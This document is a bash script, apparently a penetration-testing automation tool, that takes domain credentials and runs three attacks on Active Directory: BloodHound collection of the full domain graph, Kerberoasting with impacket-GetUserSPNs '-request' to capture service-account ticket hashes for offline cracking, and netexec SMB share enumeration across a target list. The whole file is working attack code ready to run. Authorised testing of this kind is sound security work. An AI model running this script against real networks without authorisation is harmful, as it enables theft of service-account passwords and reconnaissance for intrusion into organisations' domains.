#!/bin/bash
# pentest_automation.sh
# This script automates pentesting tasks:
#   1. Bloodhound AD enumeration
#   2. Kerberoasting with impacket-GetUserSPNs
#   3. SMB shares enumeration with netexec
#
# Usage:
#   ./pentest_automation.sh -u <username> -p <password> -d <domain> -t <targets_file> [-i <dc_ip>]

set -euo pipefail

# ANSI color codes for output formatting
RED="\033[31m"
GREEN="\033[32m"
NC="\033[0m" # No Color
BLUE="\033[1;34m"
BLUE2="\033[0;34m"
RESET="\033[0m"
BOLD="\e[1m"

# heading!

echo -e "${RED}"
echo -e " ##################################################################################"
echo -e "#${BLUE}░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░${RED}#"
echo -e "#${BLUE}░░      ░░  ░░░░  ░        ░░      ░░       ░░░      ░░  ░░░   ░        ░       ░░${RED}#"
echo -e "#${BLUE}▒  ▒▒▒▒  ▒  ▒▒▒▒  ▒▒▒▒  ▒▒▒▒  ▒▒▒▒  ▒  ▒▒▒▒  ▒  ▒▒▒▒  ▒  ▒▒   ▒▒  ▒▒▒▒▒▒▒  ▒▒▒▒  ▒${RED}#"
echo -e "#${BLUE}▓  ▓▓▓▓  ▓  ▓▓▓▓  ▓▓▓▓  ▓▓▓▓  ▓▓▓▓  ▓       ▓▓  ▓▓▓▓  ▓      ▓▓▓      ▓▓▓  ▓▓▓▓  ▓${RED}#"
echo -e "#${BLUE}█        █  ████  ████  ████  ████  █  ████  █        █  ██   ██  ███████  ████  █${RED}#"
echo -e "#${BLUE}█  ████  ██      █████  █████      ██       ██  ████  █  ███   █        █       ██${RED}#"
echo -e "#${BLUE}██████████████████████████████████████████████████████████████████████████████████${RED}#"
echo -e "#${BLUE2}█████  ${BOLD}Auto${BLUE2}mated ${BOLD}B${BLUE2}loodhound ${BOLD}A${BLUE2}D Enumeration ${BOLD}K${BLUE2}erberoasting${BOLD} E${BLUE2}tc. ${BOLD}D${BLUE2}ingleberry?  ██████${RED}#"
echo -e "#${BLUE2}▓▓▓▓▓▓▓▓▓▓▓▓                    Script Version 1.0                    ▓▓▓▓▓▓▓▓▓▓▓▓${RED}#"
echo -e "#${BLUE}▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒                                      ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒${RED}#"
echo -e "#${BLUE2}░░░░░░░░░░░░░░░░░░░░░░    by Chris McMahon and Kyle Hoehn   ░░░░░░░░░░░░░░░░░░░░░░${RED}#"
echo -e "#${BLUE}░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░${RED}#"
echo -e " ##################################################################################"
echo -e "${RESET}"

usage() {
    cat << EOF
Usage: $0 -u <username> -p <password> -d <domain> -t <targets_file> [-i <dc_ip>]
Options:
  -u   Username for authentication.
  -p   Password for authentication.
  -d   Domain name.
  -t   File containing target IPs for SMB shares enumeration.
  -i   (Optional) Domain Controller IP. If not provided, the script will attempt to auto-discover one.
EOF
    exit 1
}

# Parse command-line options
while getopts "u:p:d:t:i:h" opt; do
  case "$opt" in
    u) username="$OPTARG" ;;
    p) password="$OPTARG" ;;
    d) domain="$OPTARG" ;;
    t) targets="$OPTARG" ;;
    i) dc_ip="$OPTARG" ;;
    h) usage ;;
    *) usage ;;
  esac
done

# Validate mandatory parameters
if [ -z "${username:-}" ] || [ -z "${password:-}" ] || [ -z "${domain:-}" ] || [ -z "${targets:-}" ]; then
    echo -e "${RED}[!] Missing required parameters.${NC}"
    usage
fi

# Check that the targets file exists
if [ ! -f "$targets" ]; then
    echo -e "${RED}[!] Targets file '$targets' not found.${NC}"
    exit 1
fi

# Discover Domain Controller IP if not provided
if [ -z "${dc_ip:-}" ]; then
    echo -e "${GREEN}[*] No Domain Controller IP provided. Attempting to discover one for domain '$domain'...${NC}"
    dc_hostname=$(host -t SRV _ldap._tcp.dc._msdcs."$domain" 2>/dev/null | head -n 1 | awk '{print $NF}' | sed 's/\.$//')
    if [ -z "$dc_hostname" ]; then
        echo -e "${RED}[!] Failed to locate a Domain Controller for domain '$domain'.${NC}"
        exit 1
    fi

    dc_ip=$(getent ahosts "$dc_hostname" | awk '{print $1; exit}')
    if [ -z "$dc_ip" ]; then
        echo -e "${RED}[!] Failed to resolve the IP address for Domain Controller: $dc_hostname.${NC}"
        exit 1
    fi
    echo -e "${GREEN}[*] Discovered Domain Controller: $dc_hostname ($dc_ip)${NC}"
else
    echo -e "${GREEN}[*] Using provided Domain Controller IP: $dc_ip${NC}"
fi

# Run Bloodhound AD enumeration
echo -e "${GREEN}[*] Starting Bloodhound AD enumeration...${NC}"
if ! bloodhound-python -u "$username" -p "$password" -d "$domain" -c all --zip; then
    echo -e "${RED}[!] Bloodhound enumeration failed.${NC}"
    exit 1
fi
echo -e "${GREEN}[*] Bloodhound enumeration completed successfully.${NC}"

# Create timestamped output files for evidence
timestamp=$(date +'%Y%m%d_%H%M%S')
imp_evidence="GetUserSPNs_evidence_${timestamp}.txt"
netexec_evidence="netexec_evidence_${timestamp}.txt"

# Run Kerberoasting using impacket-GetUserSPNs and capture output
echo -e "${GREEN}[*] Starting Kerberoasting (impacket-GetUserSPNs)...${NC}"
if ! impacket-GetUserSPNs "$domain"/"$username":"$password" -dc-ip "$dc_ip" -request > "$imp_evidence" 2>&1; then
    echo -e "${RED}[!] Kerberoasting (impacket-GetUserSPNs) failed. Check $imp_evidence for details.${NC}"
    exit 1
fi
echo -e "${GREEN}[*] Kerberoasting completed successfully. Output saved to $imp_evidence${NC}"

# Run netexec SMB shares enumeration and capture output
echo -e "${GREEN}[*] Starting SMB shares enumeration (netexec)...${NC}"
if ! netexec smb "$targets" -u "$username" -p "$password" --shares > "$netexec_evidence" 2>&1; then
    echo -e "${RED}[!] SMB shares enumeration failed. Check $netexec_evidence for details.${NC}"
    exit 1
fi
echo -e "${GREEN}[*] SMB shares enumeration completed successfully. Output saved to $netexec_evidence${NC}"

echo -e "${GREEN}[*] All tasks completed successfully.${NC}"

